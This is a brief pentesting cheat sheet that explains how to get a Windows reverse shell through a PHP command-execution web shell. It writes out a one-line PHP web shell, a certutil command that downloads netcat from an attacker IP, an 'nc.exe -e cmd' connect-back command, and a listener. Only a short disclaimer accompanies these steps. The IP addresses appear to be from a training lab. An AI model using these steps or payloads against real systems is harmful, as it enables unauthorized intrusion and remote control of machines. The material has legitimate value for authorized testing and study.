# Windows Reverse Shell via PHP Command Execution

This document explains how to obtain a reverse shell on a Windows machine after uploading a PHP file that allows command execution.

⚠️ For educational and authorized testing purposes only.

---

## Step 1: Upload PHP Command Shell

Upload the following PHP file to the target web server (for example: `cmd_shell.php`):

```php
<?php system($_GET['cmd']); ?>
```

This PHP file executes system commands passed through the `cmd` GET parameter.

---

## Step 2: Download Netcat on Target (Windows)

Use `certutil.exe` to download `nc.exe` from the attacker (Kali/Base) machine:

```text
cmd_shell.php?cmd=certutil.exe -urlcache -f http://192.168.49.52/nc.exe nc.exe
```

Make sure `nc.exe` is hosted on the attacker machine (e.g., using a Python HTTP server).

---

## Step 3: Execute Reverse Shell

Execute Netcat to connect back to the attacker machine:

```text
cmd_shell.php?cmd=nc.exe -e cmd 192.168.45.189 4444
```

This command spawns a reverse CMD shell.

---

## Step 4: Start Listener on Kali / Base Machine

Start a Netcat listener on the attacker machine:

```bash
nc -nlvp 4444
```

Once the command runs successfully, a reverse shell should be received.

---

## Notes
- Works on Windows systems with `certutil.exe` available
- Outbound connections must be allowed
- Antivirus or EDR may block `nc.exe`

---

## Disclaimer
Use this technique only on systems you own or have explicit permission to test.

